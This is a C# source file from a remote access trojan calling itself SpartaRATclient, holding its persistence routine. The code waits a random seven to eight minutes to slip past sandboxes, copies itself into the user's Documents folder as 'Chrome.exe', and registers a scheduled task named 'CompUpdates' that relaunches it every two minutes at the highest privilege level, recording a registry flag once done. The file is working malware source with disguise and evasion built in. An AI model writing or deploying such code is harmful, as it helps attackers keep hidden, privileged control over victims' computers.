using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public void Create()
        {
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(450_000, 500_000));

            RegistryCheck registryCheck = new RegistryCheck();
            if (!registryCheck.CheckIfExist("HaveTaskSchedulerItem"))
            {
                FileCopy copy = new FileCopy();
                copy.This();

                string NewCurrentProgramPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
                Shell PowershellCommand = new Shell();
                PowershellCommand.Run("schtasks /create /sc minute /mo 2 /tn CompUpdates /tr \"" + NewCurrentProgramPath + "\" /rl HIGHEST");

                RegistryCreate value = new RegistryCreate();
                value.Create("HaveTaskSchedulerItem", "");
            }
        }
    }
}
